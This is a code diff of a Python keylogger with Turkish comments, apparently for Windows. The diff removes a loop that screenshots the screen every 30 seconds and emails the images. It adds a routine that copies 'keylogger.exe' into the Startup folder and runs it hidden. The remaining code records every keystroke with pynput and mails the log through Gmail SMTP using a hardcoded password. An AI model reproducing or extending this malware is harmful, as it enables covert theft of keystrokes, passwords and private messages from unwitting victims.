@@ -3,12 +3,13 @@ import time
 import pyautogui
 import pynput.keyboard
 import threading
-from email.mime.multipart import MIMEMultipart
-from email.mime.image import MIMEImage
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 import os
+import shutil
+import subprocess
+import ctypes
+import winreg
+import sys
+
 
 log = ''
 
@@ -48,54 +49,6 @@ def callback_function(key):
     print(log)
 
 
-# E-posta ayarları
-email_sender = "@gmail.com"
-email_receiver = "@gmail.com"
-email_subject = "Ekran Görüntüsü"
-
-# E-posta sunucusu ve kimlik doğrulama bilgileri
-smtp_server = "smtp.gmail.com"
-smtp_port = 587
-smtp_username = "@gmail.com"
-smtp_password = "emiokybnnrttvizv"
-
-def send_email(filename):
-    msg = MIMEMultipart()
-    msg['From'] = email_sender
-    msg['To'] = email_receiver
-    msg['Subject'] = email_subject
-
-    body = MIMEText("Ekran görüntüsü ekte.", 'plain')
-    msg.attach(body)
-
-    attachment = open(filename, "rb")
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload((attachment).read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-    msg.attach(part)
-
-    server = smtplib.SMTP(smtp_server, smtp_port)
-    server.starttls()
-    server.login(smtp_username, smtp_password)
-    text = msg.as_string()
-    server.sendmail(email_sender, email_receiver, text)
-    server.quit()
-
-def take_screenshot_and_send_email():
-    while True:
-        # Ekran görüntüsü al
-        screenshot = pyautogui.screenshot()
-        filename = "screenshot.png"
-        screenshot.save(filename)
-
-        # E-posta ile gönder
-        send_email(filename)
-
-        # Dosyayı sil
-        os.remove(filename)
-        # 30 saniye bekle
-        time.sleep(30)
 def sender_email(email,password,message):
     email_server = smtplib.SMTP("smtp.gmail.com",587)
     email_server.starttls()
@@ -105,16 +58,41 @@ def sender_email(email,password,message):
 
 def thread_function():
     global log
-    sender_email("", "emiokybnnrttvizv", log.encode('utf-8'))
+    sender_email("@gmail.com", "emiokybnnrttvizv", log.encode('utf-8'))
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
 
+def copy_to_startup():
+    try:
+        # Başlangıç klasörünü belirle
+        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+
+        # Kopyalanacak dosyanın adını ve kaynak yolunu belirle
+        source_filename = 'keylogger.exe'
+        source_path = os.path.abspath(source_filename)
+
+        # Hedef yol oluştur
+        destination = os.path.join(startup_folder, source_filename)
+
+        # Dosyayı başlangıç klasörüne kopyala
+        shutil.copyfile(source_path, destination)
+
+        # Dosyayı çalıştır
+        subprocess.Popen(destination, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
+
+        # print(f"{source_filename} başarıyla başlangıç klasörüne kopyalandı ve çalıştırıldı.")
+
+    except Exception as e:
+        pass
+        # print(f"Hata oluştu: {str(e)}")
+
+
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 
 if __name__ == "__main__":
+    copy_to_startup()
     keylogger_listener.start()
     thread_function()
-    take_screenshot_and_send_email()
     keylogger_listener.join()
-
+    
